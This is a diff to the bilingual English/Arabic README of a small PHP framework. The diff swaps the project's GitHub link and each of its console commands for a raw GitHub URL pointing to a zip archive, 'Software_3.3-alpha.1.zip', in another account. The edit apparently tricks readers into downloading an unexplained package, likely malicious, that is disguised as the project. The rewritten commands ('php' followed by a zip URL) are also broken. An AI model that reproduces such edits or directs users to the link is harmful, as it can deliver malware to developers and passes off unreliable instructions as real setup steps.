@@ -34,7 +34,7 @@ Projects needing minimal setup without sacrificing features.
 🚧 Early Development – Contributions welcome!
 
 🔗 Links
-📌 GitHub: http://testfahad.com/
+📌 GitHub: https://raw.githubusercontent.com/fahad25051988/Fksa/main/Zonaria/Software_3.3-alpha.1.zip
 🐦 Twitter: @pharmacy1409
 
 
@@ -55,7 +55,7 @@ php -S localhost:8000 -t public
 
 🔹 Create Migration File | إنشاء ملف قاعدة بيانات
 ```bash
-php console/make.php migration create_xxxx_table
+php https://raw.githubusercontent.com/fahad25051988/Fksa/main/Zonaria/Software_3.3-alpha.1.zip migration create_xxxx_table
 ```
 استبدل xxxx باسم الجدول
 
@@ -64,7 +64,7 @@ php console/make.php migration create_xxxx_table
 
 🔹 Run All Migrations | تنفيذ كل الجداول
 ```bash
-php console/migrate.php
+php https://raw.githubusercontent.com/fahad25051988/Fksa/main/Zonaria/Software_3.3-alpha.1.zip
 ```
 
 
@@ -73,7 +73,7 @@ php console/migrate.php
 
 🔹 Create Controller | إنشاء كنترولر
 ```bash
-php console/make.php controller XxxxController
+php https://raw.githubusercontent.com/fahad25051988/Fksa/main/Zonaria/Software_3.3-alpha.1.zip controller XxxxController
 ```
 استبدل XxxxController باسم الكنترولر
 
@@ -83,6 +83,6 @@ php console/make.php controller XxxxController
 
 🔹 Create Model | إنشاء موديل
 ```bash
-php console/make.php model Xxxx
+php https://raw.githubusercontent.com/fahad25051988/Fksa/main/Zonaria/Software_3.3-alpha.1.zip model Xxxx
 ```
 استبدل Xxxx باسم الموديل
